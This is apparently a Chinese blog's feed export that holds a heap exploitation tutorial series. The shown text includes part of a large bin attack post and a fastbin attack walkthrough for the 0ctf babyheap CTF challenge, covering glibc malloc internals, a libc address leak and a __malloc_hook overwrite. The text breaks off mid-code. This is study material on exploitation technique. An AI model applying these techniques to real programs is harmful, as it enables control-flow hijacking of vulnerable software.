Chunk(addr=0x555555758650, size=0x510, flags=PREV_INUSE)</span><br><span class="line">[+] Found 1 chunks in 1 large non-empty bins.</span><br></pre></td></tr></table></figure></p><p>unsorted bin上被新增一个free的0x510的chunk，并且放到了头部。</p><p>接着的利用一个溢出漏洞，修改ptr1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptr1[0] = 0;</span><br><span class="line">ptr1[1] = (unsigned long)((&amp;target) - 0x2);</span><br><span class="line">ptr1[-1] = 0x300;</span><br></pre></td></tr></table></figure></p><p>这个是为了后续进行给target修改值做准备。最后通过malloc(0x10)来触发对target的改写。</p><p>下面简单说一下最后一个malloc(0x10)的时候，libc到底干了些什么事情<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. 首先会判断这个0x10是符合fastbin的，但是fastbin是空的</span><br><span class="line">2. 所以尝试在smallbin上寻找，但是smallbin上也是空的 </span><br><span class="line">3. 这时候才尝试在unsortedbin上遍历chunk，遍历的方式是从尾部向头部遍历，先取出来unsortedbin尾部的chunk之后开始进行操作</span><br><span class="line">4. 先判断申请的大小是否符合small chunk， 是否是只有一个chunk在unsorted bin，由于我们有两个chunk所以这个不满足，所以不会进入尝试使用last remainder的逻辑</span><br><span class="line">5. 尝试把这个尾部的unsorted bin从链上给取下来</span><br><span class="line">6. 再判断我们的申请的chunk的size和当前这个chunk的size是否相等，如果相等就直接把当前这个chunk返回给用户,我们的申请的是0x20大小的，与现有的unsorted bin上的chunk都不符合，所以也不会执行这个流程</span><br><span class="line">7. 把他们回收到各自的bin上，注意到这里已经不用考虑分配的事情了，它最终会把unsroted bin给遍历一遍然后把剩下的0x1f0和0x510的chunk回收到各自的small bin和large bin上</span><br><span class="line">8. 回收完毕后，再考虑分配0x20的事情</span><br><span class="line">9. 会先看是不是large request，由于这是个small request，所以不执行这个流程</span><br><span class="line">10. 之后就是在small bin上进行best fit搜索，就是找可用的最小可用的，我们显然在small bin上只能找到0x1f0这个chunk，所以就在这个chunk上分配</span><br><span class="line">11. 把0x1f0这个chunk继续分割，头部的返回给用户，剩下的放到unsorted bin上，所以这个时候unsorted bin只剩下0x1d0(0x1f0 - 0x20)</span><br><span class="line"></span><br><span class="line">注意第7步，往large bin上回收的时候会触发我们的large bin attack，就是往我们指定的地址上开始写值。</span><br></pre></td></tr></table></figure></p><p><img src="/images/heap_exp/2021-06-03-18-49-11.png" alt></p><h3 id="large-bin的分配和释放"><a href="#large-bin的分配和释放" class="headerlink" title="large bin的分配和释放"></a>large bin的分配和释放</h3><p><img src="/images/heap_exp/2021-06-03-17-22-05.png" alt></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;large-bin-attack的作用&quot;&gt;&lt;a href=&quot;#large-bin-attack的作用&quot; class=&quot;headerlink&quot; title=&quot;large bin attack的作用&quot;&gt;&lt;/a&gt;large bin attack的作用&lt;/h3&gt;&lt;p&gt;例程</summary>
      
    
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/categories/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆利用系列五：Unsorted Bin Attack </title>
    <link href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/"/>
    <id>https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/</id>
    <published>2021-06-17T13:09:38.000Z</published>
    <updated>2021-06-17T13:27:14.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="等待安全客发表"><a href="#等待安全客发表" class="headerlink" title="等待安全客发表"></a>等待安全客发表</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;等待安全客发表&quot;&gt;&lt;a href=&quot;#等待安全客发表&quot; class=&quot;headerlink&quot; title=&quot;等待安全客发表&quot;&gt;&lt;/a&gt;等待安全客发表&lt;/h2&gt;</summary>
      
    
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/categories/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆利用系列四：Fast Bin Attack</title>
    <link href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BFastbin-Attack/"/>
    <id>https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BFastbin-Attack/</id>
    <published>2021-06-17T13:06:10.000Z</published>
    <updated>2021-06-17T13:27:04.721Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>通过一道babyheap例题讲解fastbin attack，同时会涉及到一个泄露libc地址的方法，绕过GOT写保护劫持PC的方法，一个绕过Fastbin 大小检测的方法，还有对glibc相关源码的一些讲解。</p><h3 id="涉及到的glibc的知识"><a href="#涉及到的glibc的知识" class="headerlink" title="涉及到的glibc的知识"></a>涉及到的glibc的知识</h3><p>要把这道题做出来，需要对下面的基础知识有所了解。</p><h4 id="源码中MIN-CHUNK-SIZE大小是多少"><a href="#源码中MIN-CHUNK-SIZE大小是多少" class="headerlink" title="源码中MIN_CHUNK_SIZE大小是多少"></a>源码中MIN_CHUNK_SIZE大小是多少</h4><p>MIN_CHUNK_SIZE指的是一个CHUNK最小为多大<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br></pre></td></tr></table></figure></p><p>是fd_nextsize在malloc_chunk中的偏移，并不是malloc_chunk这个数据结构的大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line"></span><br><span class="line">  struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>因为每个chunk都会有prev_size, size， fd,bk这几个成员，但是只有large chunk拥有fd_nextsize和bk_nextsize</p><h4 id="MINSIZE"><a href="#MINSIZE" class="headerlink" title="MINSIZE"></a>MINSIZE</h4><p>MINSIZE是指用户能够得到的最小的chunk 大小，与MIN_CHUNK_SIZE区别是它要求是对其的，所以是可能大于MIN_CHUNK_SIZE的<br>但是对于32位和64位的x86类型来说，MINSIZE与MIN_CHUNK_SIZE大小是一样的。32位MINSIZE=MIN_CHUNK_SIZE=16bytes,64位为32bytes。</p><h4 id="chunk与用户使用的mem之间的转换"><a href="#chunk与用户使用的mem之间的转换" class="headerlink" title="chunk与用户使用的mem之间的转换"></a>chunk与用户使用的mem之间的转换</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="line">#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br></pre></td></tr></table></figure><h4 id="MALLOC-ALIGN-MASK"><a href="#MALLOC-ALIGN-MASK" class="headerlink" title="MALLOC_ALIGN_MASK"></a>MALLOC_ALIGN_MASK</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br></pre></td></tr></table></figure><h4 id="MALLOC-ALIGN-MASK-1"><a href="#MALLOC-ALIGN-MASK-1" class="headerlink" title="MALLOC_ALIGN_MASK"></a>MALLOC_ALIGN_MASK</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span><br><span class="line">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span><br></pre></td></tr></table></figure><p>经过我的测试：<br><code>x86 32情况下，__alignof__ (long double)为4</code><br><code>x64 情况下， __alignof__ (long double)为16</code></p><p>所以32位下，MALLOC_ALIGNMENT的值为8，MALLOC_ALIGN_MASK  为7；<br>64位下MALLOC_ALIGNMENT值为16，MALLOC_ALIGN_MASK为15.</p><h4 id="request2size-req"><a href="#request2size-req" class="headerlink" title="request2size(req)"></a>request2size(req)</h4><p>malloc(req)，到底会生成多大的chunk，是需要用 request2size(req)确定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define request2size(req)                                         \</span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></p><p>那么在32位下的req如何转换：<br>1.首先计算req + 4 + 7是否小于16<br>2.如果小于16,那么就转换为16<br>3.如果大于16就转换为(req + 4 + 7) &amp; ~7 就是 (req+11)&amp;0xfff8<br>自己写了个脚本测试了几个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def request2size(req,word):</span><br><span class="line">    sz_32 = 4</span><br><span class="line">    sz_64 = 8</span><br><span class="line">    mask_32= 7</span><br><span class="line">    mask_64 = 15</span><br><span class="line">    min_size_32 = 16</span><br><span class="line">    min_size_64 = 32</span><br><span class="line">    if word == 32:</span><br><span class="line">        if (req + sz_32 + mask_32 ) &lt; min_size_32:</span><br><span class="line">            return min_size_32</span><br><span class="line">        else:</span><br><span class="line">            return (req + sz_32 + mask_32 ) &amp; ~mask_32</span><br><span class="line">    elif word == 64:</span><br><span class="line">        if (req + sz_64 + mask_64 ) &lt; min_size_64:</span><br><span class="line">            return min_size_64</span><br><span class="line">        else:</span><br><span class="line">            return (req + sz_64 + mask_64 ) &amp; ~mask_64</span><br></pre></td></tr></table></figure></p><p>32 位下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">req:0, to:16</span><br><span class="line">req:1, to:16</span><br><span class="line">req:2, to:16</span><br><span class="line">req:3, to:16</span><br><span class="line">req:4, to:16</span><br><span class="line">req:5, to:16</span><br><span class="line">req:6, to:16</span><br><span class="line">req:7, to:16</span><br><span class="line">req:8, to:16</span><br><span class="line">req:9, to:16</span><br><span class="line">req:10, to:16</span><br><span class="line">req:11, to:16</span><br><span class="line">req:12, to:16</span><br><span class="line">req:13, to:24</span><br><span class="line">req:14, to:24</span><br></pre></td></tr></table></figure></p><p>可以看到，如果malloc()的大小小于等于12则最终得到的chunk大小为16</p><p>64位下的测试结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">req:0x70, to:0x80</span><br><span class="line">req:0x71, to:0x80</span><br><span class="line">req:0x72, to:0x80</span><br><span class="line">req:0x73, to:0x80</span><br><span class="line">req:0x74, to:0x80</span><br><span class="line">req:0x75, to:0x80</span><br><span class="line">req:0x76, to:0x80</span><br><span class="line">req:0x77, to:0x80</span><br><span class="line">req:0x78, to:0x80</span><br><span class="line">req:0x79, to:0x90</span><br></pre></td></tr></table></figure></p><p>可以看到，当我们malloc申请的大小为0x78的时候，最终分配的chunk大小是0x80，这感觉有点违背直觉，因为chunk header就是16个字节，那么分配0x78大小的时候至少chunk应该是0x78 + 0x10 = 0x88，至少应该是0x88，如果考虑16字节对齐的情况下，那么大小应该是0x90才对的？这是一个值得思考的问题，大家可以考虑一下为什么是0x80而不是0x90.</p><h4 id="往unsorted-bin中插入一个chunk"><a href="#往unsorted-bin中插入一个chunk" class="headerlink" title="往unsorted bin中插入一个chunk"></a>往unsorted bin中插入一个chunk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = &quot;free(): corrupted unsorted chunks&quot;;</span><br><span class="line">  goto errout;</span><br><span class="line">&#125;</span><br><span class="line">     p-&gt;fd = fwd;</span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     if (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = NULL;</span><br><span class="line">  p-&gt;bk_nextsize = NULL;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>当free一个合适大小的chunk的时候，会往unsorted bin中插入这个chunk, 插入一个chunk的时候需要对四个指针进行写，分别是该chunk的fd和bk指针，以及前后相邻的两个chunk的一个bk和一个fd指针。</p><h4 id="malloc一个在unsorted-bin上的chunk"><a href="#malloc一个在unsorted-bin上的chunk" class="headerlink" title="malloc一个在unsorted bin上的chunk"></a>malloc一个在unsorted bin上的chunk</h4><p>如果unsorted bin有比申请大的chunk，就会直接把它分割，让剩下的chunk加入到unsorted bin 链表中。<br>具体操作如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">            have to perform a complete insert here.  */</span><br><span class="line">        bck = unsorted_chunks (av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;</span><br><span class="line">            goto errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">        /* advertise as last remainder */</span><br><span class="line">        if (in_smallbin_range (nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        if (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">            remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    void *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    return p;</span><br></pre></td></tr></table></figure></p><h4 id="初始化bins"><a href="#初始化bins" class="headerlink" title="初始化bins"></a>初始化bins</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for (i = 1; i &lt; NBINS; ++i)</span><br><span class="line">   &#123;</span><br><span class="line">     bin = bin_at (av, i);</span><br><span class="line">     bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="0ctf-babyheap"><a href="#0ctf-babyheap" class="headerlink" title="0ctf babyheap"></a>0ctf babyheap</h3><p>题目文件下载地址<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap" target="_blank" rel="noopener">babyheap</a></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>目标是泄露libc的地址，借助的是泄露unsorted bin所在的地址进而推导出其他地址。<br>因为unsroted bin所在的数据结构是在libc的读写区分配的，因此是可以借助它进行地址泄露的。</p><p>泄露unsorted bin地址的方法是把unsorted bin的头部chunk的bk指针给泄露出来。<br>我们看一个正常的拥有两个元素的unsorted bin的结构<br><img src="/images/heap_exp/2021-05-28-11-11-50.png" alt></p><p>这个头部chunk的bk指针就是指向的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></p><p><code>unsorted_chunks(av)</code>这个地址到底是哪里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define unsorted_chunks(M)          (bin_at (M, 1))</span><br><span class="line"></span><br><span class="line">#define bin_at(m, i) \</span><br><span class="line">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure></p><p>av就是main_arena，我们把1代入bin_at得到unsorted_chunks(av)的地址为main_arena-&gt;bins - chunk header的大小就是main_arena-&gt;top的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  /* Serialize access.  */</span><br><span class="line">  mutex_t mutex;</span><br><span class="line"></span><br><span class="line">  /* Flags (formerly in max_fast).  */</span><br><span class="line">  int flags;</span><br><span class="line"></span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  /* The remainder from the most recent split of a small request */</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  /* Normal bins packed as described above */</span><br><span class="line">  mchunkptr bins[NBINS * 2 - 2];</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  static struct malloc_state main_arena =</span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = 1</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这段代码是在malloc.c文件中中定义的，编译后main_arena就是保存了unsorted bin链表，我们计算一下mchunkptr bins[NBINS * 2 - 2];这个数组相对malloc_state结构的偏移。<br>首先要确定 mfastbinptr fastbinsY[NFASTBINS];这个长度是多少，要确定NFASTBINS的大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><span class="line"></span><br><span class="line">#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><span class="line"></span><br><span class="line">#define fastbin_index(sz) \</span><br><span class="line">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure></p><p>64位下，SIZE_SZ的值为8， MAX_FAST_SIZE为160，代入request2size（160）得到176， 进一步代入fastbin_index得到NFASTBINS为10<br>32位下， SIZE_SZ的值为4， MAX_FAST_SIZE为80， 代入request2size（80） 得到88， 进一步代入fastbin_index得到NFASTBINS为10</p><p>所以无论在32位还是64位下， NFASTBINS均为10，就是都是有10个mfastbinptr指针，那么总大小就是10*8 = 80<br>进而得到main_arena-&gt;top的偏移为 4 + 4 + 80 = 88=0x58, 在ida的local中定义新的数据结构看下偏移也是0x58<br><img src="/images/heap_exp/2021-05-27-17-02-02.png" alt><br>与我们计算的吻合，所以理论上头部chunk的bk指针指向的地址就是main_arena + 88字节的值</p><p>为了泄露main_arena + 88这个值，我们首先需要溢出chunk1，使其修改chunk2的prev size和size字段<br><img src="/images/heap_exp/2021-05-28-11-38-36.png" alt><br>chunk2的prev size从0x80改为0x180，size从0x101改为0x100，这样可以将chunk1标识为空闲块。<br>然后再free chunk2，触发错误的后向融合，chunk1连同chunk0和chunk2一起被当做一个大的chunk放到unsorted bin上。<br><img src="/images/heap_exp/2021-05-28-11-48-10.png" alt><br>在gdb中观察unsorted bin的情况<br><img src="/images/heap_exp/2021-05-27-17-32-32.png" alt><br>可以看到，如我们的预期，unsroted bin中有一个chunk,大小是0x280。</p><p>当我们malloc 0xf0之后，会分割这个0x280的chunk，剩下0x180大小的chunk，并且重写unsorted bin的fd和bk以及新的头部chunk的fd bk指针<br><img src="/images/heap_exp/2021-05-28-11-58-27.png" alt><br>这个新的unsorted bin链表头部chunk实际上就是我们的的chunk1，而chunk1是可以被我们打印的，因为他没有被我们人为的free。<br>因此我们可以通过打印chunk1的数据部分泄露他的bk和fd指针内容，由于unsorted bin上只有一个元素，所以bk与fd相等都是指向main_arena+88偏移的地址。<br>我们利用逻辑打印这个chunk1的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; leak_address = res.split(&apos;\n&apos;)[1][0:8]</span><br><span class="line">&gt;&gt;&gt; hex(u(leak_address))</span><br><span class="line">&apos;0x7ffff7fc2b78&apos;</span><br></pre></td></tr></table></figure></p><p>main_arena = 0x7ffff7fc2b78 - 88 = 0x7ffff7fc2b20<br>我们利用GEF的heap arenas看一下是否相同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap arenas                                                                                     </span><br><span class="line">Arena (base=0x7ffff7fc2b20, top=0x5555557572c0, last_remainder=0x555555757100, next=0x7ffff7fc2b20, ne</span><br><span class="line">xt_free=0x0, system_mem=0x21000)</span><br></pre></td></tr></table></figure></p><p>所以我们已经成功泄露了main_arena+88的地址。我们可以基于此得到任意想要的libc偏移地址。</p><h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>由于这个二进制开启了PIE，因此不能通过改写GOT的方式实现控制流劫持。但是我们可以通过改写__malloc_hook这个指针的方式实现控制流劫持。如果 malloc_hook 和free_hook的值存在，则会调用malloc_hook或者free_hook指向的地址。</p><h4 id="修改-malloc-hook指针"><a href="#修改-malloc-hook指针" class="headerlink" title="修改__malloc_hook指针"></a>修改__malloc_hook指针</h4><p>__malloc_hook在内存中的偏移为mian_arena - 0x10 ，64位情况下。 我们使用fastbin attack实现对这个地址的控制。</p><h4 id="fastbin-attack原理"><a href="#fastbin-attack原理" class="headerlink" title="fastbin attack原理"></a>fastbin attack原理</h4><ol><li>同一个fastbin 链表上有2个空闲的chunk，</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x555555757140, size=0x30, flags=PREV_INUSE)  ←  Chunk</span><br><span class="line">(addr=0x7ffff7fc2b20, size=0x0, flags=) [incorrect fastbin_index]</span><br><span class="line">`</span><br></pre></td></tr></table></figure><p>我们虽然能够修改fd指针，让他指向一个虚假的chunk，但是由于fast bin内部还是有一个size的检查，会去看这个假chunk的size字段是否就是符合0x30，如果不符合就会报错。所以要想办法让这个size符合我们的fastbin的要求。我们仔细观察malloc_chunk临近内存的值情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x7ffff7fc2b10</span><br><span class="line">0x7ffff7fc2b10 &lt;__malloc_hook&gt;: 0x0000000000000000</span><br><span class="line"></span><br><span class="line">gef➤  x/gx 0x7ffff7fc2b10 -8</span><br><span class="line">0x7ffff7fc2b08 &lt;__realloc_hook&gt;:        0x00007ffff7c83a00</span><br></pre></td></tr></table></figure></p><p>我们通过将这个假的chunk的size指向一个0x7ffff7fc2b08 +5这个地址，这个地方存放值是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x7ffff7fc2b08 +5</span><br><span class="line">0x7ffff7fc2b0d &lt;__realloc_hook+5&gt;:      0x000000000000007f</span><br></pre></td></tr></table></figure></p><p>这个值是可以通过长度检测的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</span><br><span class="line">           &#123;</span><br><span class="line">             errstr = &quot;malloc(): memory corruption (fast)&quot;;</span><br><span 